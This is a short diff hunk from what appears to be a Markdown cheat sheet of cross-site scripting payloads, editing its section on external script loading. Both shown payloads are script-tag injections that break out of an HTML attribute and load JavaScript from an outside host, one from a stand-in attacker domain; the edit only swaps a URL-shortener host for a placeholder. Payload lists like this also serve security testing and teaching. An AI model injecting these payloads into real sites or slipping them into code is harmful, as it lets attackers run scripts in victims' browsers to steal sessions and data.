@@ -72,7 +72,7 @@
 ### External Script Loading
 ```
 <script src=//attacker.com/xss.js></script>
-"><script src=//t.cn/xxxxx></script>
+"><script src=//short.example/xxxxx></script>
 ```
 
 ## Bypass Techniques
